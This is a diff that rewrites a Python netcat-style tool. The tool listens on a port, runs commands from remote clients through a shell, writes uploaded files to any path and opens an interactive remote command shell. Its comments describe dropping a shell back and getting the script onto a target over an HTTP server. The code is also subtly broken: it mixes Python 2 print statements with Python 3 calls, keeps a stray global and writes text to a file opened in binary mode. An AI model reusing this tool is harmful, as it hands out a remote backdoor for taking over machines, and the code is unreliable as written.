@@ -1,20 +1,17 @@
-import sys
-import socket
-import getopt
-import threading
-import subprocess
+import sys, socket, getopt, threading, subprocess, argparse
 
-#Definition of global variables
-    listen = False
-    command = False
-    execute = ""
-    target = ""
-    upload_destination = ""
-    port = 0
+# Definition of the global variables
+listen = False
+command = False
+execute = ""
+target = ""
+upload_destination = ""
+port = 0
 
-#Main purpose is to teach how to use this cool thingy. You can alwasy use whatever port
+#Main purpose is to teach how to use this cool thingy. You can always get this shit by hosting a SimpleHTTP server
+#only if the machine knows how to interpret Python2
 def usage():
-    print "By n0t_4kum4\n"
+    print "By n0t_4KUM4\n"
     print "How to use me: ThisCoolScript.py -t [target_host] -p [port]"
     print "-l --listen listen on [host]:[port] for incomming connections"
     print "-e --execute=[file_to_run] -execute the given file upon connection received"
@@ -28,182 +25,172 @@ def usage():
     sys.exit(0)
 
 #Definition of main. Obs!
-def main()
-    global listen
+def main():
+    global target
     global port
+    global listen
     global execute
     global command
     global upload_destination
-    global target
-                                                                                                                                                                                                                                                                                                  
-    if not len(sys.argv[1:]):usage()                                                                                                                                                                                                                                                              
-    try: opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu", ["help","listen","execute","target","port","command","upload"])                                                                                                                                                                    
-    except getopt.GetoptError as err:                                                                                                                                                                                                                                                             
-        print str(err)                                                                                                                                                                                                                                                                            
-        usage()                                                                                                                                                                                                                                                                                   
-                                                                                                                                                                                                                                                                                                  
-        for o,a in opts:                                                                                                                                                                                                                                                                          
-            if o in ("-h","--help"):                                                                                                                                                                                                                                                              
-                usage()                                                                                                                                                                                                                                                                           
-            elif o in ("-l","--listen"):                                                                                                                                                                                                                                                          
-                listen = True                                                                                                                                                                                                                                                                     
-            elif o in ("-e", "--execute"):                                                                                                                                                                                                                                                        
-                execute = a                                                                                                                                                                                                                                                                       
-            elif o in ("-c", "--commandshell"):                                                                                                                                                                                                                                                   
-                command = True                                                                                                                                                                                                                                                                    
-            elif o in ("-u", "--upload"):                                                                                                                                                                                                                                                         
-                upload_destination = a                                                                                                                                                                                                                                                            
-            elif o in ("-t", "--target"):                                                                                                                                                                                                                                                         
-                target = a                                                                                                                                                                                                                                                                        
-            elif o in ("-p", "--port"):                                                                                                                                                                                                                                                           
-                port = int(a)                                                                                                                                                                                                                                                                     
-            else:                                                                                                                                                                                                                                                                                 
-                Assert False, "Not an option pal."                                                                                                                                                                                                                                                
-                                                                                                                                                                                                                                                                                                  
-        if not listen and len(target) and port > 0:                                                                                                                                                                                                                                               
-                                                                                                                                                                                                                                                                                                  
-            #read in the buffer from cli                                                                                                                                                                                                                                                          
-            #if no input, CTRL-D                                                                                                                                                                                                                                                                  
-            buffer = sys.stdin.read()                                                                                                                                                                                                                                                             
-                                                                                                                                                                                                                                                                                                  
-            #sending data off                                                                                                                                                                                                                                                                     
-            client_sender(buffer)                                                                                                                                                                                                                                                                 
-                                                                                                                                                                                                                                                                                                  
-            #Listen and upload things, execute commands, and, drop shell back
-            if listen:
-                server_loop()
 
-main()
+    # Set up argument parsing
+    parser = argparse.ArgumentParser(description="Simple ncat clone.")
+    parser.add_argument("port", type=int, help="target port")
+    parser.add_argument("-t", "--target_host", type=str, help="target host", default="0.0.0.0")
+    parser.add_argument("-l", "--listen", help="listen on [host]:[port] for incomming connections", action="store_true", default=False)
+    parser.add_argument("-e", "--execute", help="--execute=file_to_run execute the given file upn receiving a connection")
+    parser.add_argument("-c", "--command", help="initialize a command shell", action="store_true", default=False)
+    parser.add_argument("-u", "--upload", help="--upload=destination upon receing connection upload a file and write to [destination]")
+    args = parser.parse_args()
 
-def client_sender(buffer):
+    # parse arguements
+    target = args.target_host
+    port = args.port
+    listen = args.listen
+    execute = args.execute
+    command = args.command
+    upload_destination = args.upload
+
+    # are we goint to listen or just send data from stdin?
+    if not listen and target is not None and port > 0:
+        print("DBG: read data from stdin")
+        # read buffer from stdin, this will block so send CTRL-D if not
+        # sending to stdin
+        buff = sys.stdin.read()
+
+        print("Sending {0} to client".format(buff))
+        # send data off
+        client_sender(buff)
+
+    # we are going to listen and potentially upload things, execute
+    # commands and drop a shell back, depending on the command line options
+    if listen:
+        server_loop()
+
+def client_sender(buff):
+    print("DBG: sending data to client on port " + str(port))
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        #Connection to target host
-        client.connect((target,port))
+        # connect to target host
+        client.connect((target, port))
 
-        if len(buffer):
-            client.send(buffer)
-
-        while true:
-            #waiting for the data to come back
+        if len(buff):
+            client.send(buff.encode())
+        while True:
+            # now let's wait for data response
             recv_len = 1
             response = ""
 
             while recv_len:
-
+                print("DBG: waiting for response from client")
                 data = client.recv(4096)
                 recv_len = len(data)
-                response+= data
+                response += data.decode(errors="ignore")
 
                 if recv_len < 4096:
                     break
-            
+
             print response,
 
-            #waiting for more input
-            buffer = raw_input
-            buffer = raw_input("")
-            buffer += "\n"
+            # wait for more input
+            buff = input("")
+            buff += "\n"
 
-            #Sending it off
-            client.send(buffer)
-
+            # send it off
+            client.send(buff.encode())
     except:
-
-        print "[*] Exception! Exitting."
-
-        #Tearing down of the connection
+        print("[*] Exception! Exiting.")
+    finally:
         client.close()
 
 def server_loop():
     global target
-
-    # if no target is defined, we listen all interfaces
-    if not len(target):
-        target = "0.0.0.0"
+    print("DBG: entering server loop")
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.blind((target,port))
+    server.bind((target, port))
+
     server.listen(5)
 
     while True:
         client_socket, addr = server.accept()
 
-        #spin off a thread to handle the new client
-        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
+        # spin a thread to handle the new client
+        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
         client_thread.start()
 
 def run_command(command):
-
-    #New line trimming
+    # trim the newline
     command = command.rstrip()
+    print("DBG: executing command: " + command)
 
-    # run the command and spit the output back
     try:
+        # this will launch a new process, NOTE: cd commands are useless
         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-
     except:
-        output = "Execution of the command failed. \r\n"
+        output = "Failed to execute comamnd.\r\n"
 
-    #Sending the output back to the client
+    # send the output back to the client
     return output
 
 def client_handler(client_socket):
     global upload
     global execute
     global command
+    print("DBG: handling client socket")
 
-    # Check for upload
-    if len(upload_destination):
+    # check for upload
+    if upload_destination is not None:
+        print("DBG: entering file upload")
+        # read all of the bytes and write them to the destination
+        file_buff = ""
 
-        #Read in all the bytes and write it out to the destination
-        file_buffer = ""
-
-        #Keep reading data until none is available
+        # keep reading data until none is available
         while True:
             data = client_socket.recv(1024)
-
             if not data:
                 break
             else:
-                file_buffer += data
+                file_buff += data.decode()
 
-        try: 
-            file_descriptor = open(upload_destination, "wb")
-            file_descriptor.write(file_buffer)
-            file_descriptor.close()
+        # write bytes to file
+        try:
+            f = open(upload_destination, "wb")
+            f.write(file_buff)
+            f.close()
 
-            #Acknowledge that we wrote the file out
-            client_socket.send("Successfully saved file to the %s\r\n" % upload_destination)
-
+            # ACK file writing
+            client_socket.send("Successfully saved file to: {0}\r\n".format(upload_destination).encode())
         except:
-            client.socket.send("Failed to save the file to %s\r\n" % upload_destination)
+            client_socket.send("Failed to save file to {0}. Are you sure the directory exists?\r\n".format(upload_destination).encode())
 
-    #Checking command execution
-    if len(execute):
-
-        #run the command
+    if execute is not None:
+        print("DBG: going to execute command")
+        # run the command
         output = run_command(execute)
+        client_socket.send(output.encode())
 
-        client_socket.send(output)
-
-    #Another loop if a shell was requested
+    # go into loop ifa command shell was requested
     if command:
-
+        print("DBG: shell requested")
+        # show a prompt
+        client_socket.send("<BHP:#> ".encode())
         while True:
-            # Simple prompt
-            client_socket.send("<4KUM4:#> ")
 
-                (enter key)
-            cmd_buffer = ""
-            while "\n" not in cmd_buffer:
+            # now recieve until linefeed
+            cmd_buff = ""
+            while "\n" not in cmd_buff:
+                cmd_buff += client_socket.recv(1024).decode()
 
-                cmd_buffer += client_socket.recv(1024)
-            
-            #Sending back the command output
-            response = run_command(cmd_buffer)
-            
-            #Sending back the response
-            client_socket.send(response)
+            # send back the command output
+            response = run_command(cmd_buff)
+
+            if isinstance(response, str):
+                response = response.encode()
+
+            # send back the response
+            client_socket.send(response + "<4KUM4:#> ".encode())
+
+main()
